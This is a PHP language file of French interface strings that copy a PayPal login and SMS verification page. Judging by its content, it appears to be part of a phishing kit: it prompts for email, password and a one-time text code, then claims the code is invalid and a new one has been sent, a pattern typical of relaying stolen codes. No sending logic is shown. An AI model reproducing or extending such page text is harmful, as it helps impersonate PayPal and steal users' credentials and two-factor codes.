<?php

function lang($phrase){
    static $lang = array(
        '1' => 'Connectez-vous à votre compte PayPal',
        '2' => 'Adresse e-mail ou numéro de téléphone mobile',
        '3' => 'Mot de passe',
        '4' => 'Mot de passe oublié?',
        '5' => 'Se connecter',
        '6' => 'ou',
        '7' => 'S\'inscrire',
        '8' => 'Anglais',
        '9' => 'Français',
        '10' => 'Espagnol',
        '11' => '文',
        '12' => 'Vérification de sécurité rapide',
        '13' => 'Nous avons juste besoin de quelques informations supplémentaires pour confirmer que c\'est bien vous.',
        '14' => 'Recevoir un texto',
        '15' => 'En continuant, vous confirmez que vous êtes autorisé à utiliser ce numéro de téléphone et acceptez de recevoir des messages texte pour confirmer votre identité lors de cette session. Des frais de votre opérateur peuvent s\'appliquer. Nous pouvons recevoir des détails sur l\'abonné et l\'appareil de votre opérateur sans fil à des fins de risque et de fraude.',
        '16' => 'Suivant',
        '17' => 'Saisissez votre code.',
        '18' => 'Renvoyer',
        '19' => 'Continuer',
        '20' => 'Nous contacter',
        '21' => 'Confidentialité',
        '22' => 'Légal',
        '23' => 'Mises à jour de la politique',
        '24' => 'Dans le monde entier',
        '25' => 'Code non valide. Nous vous avons envoyé un nouveau code.',
    );

    return $lang[$phrase];
}
?>
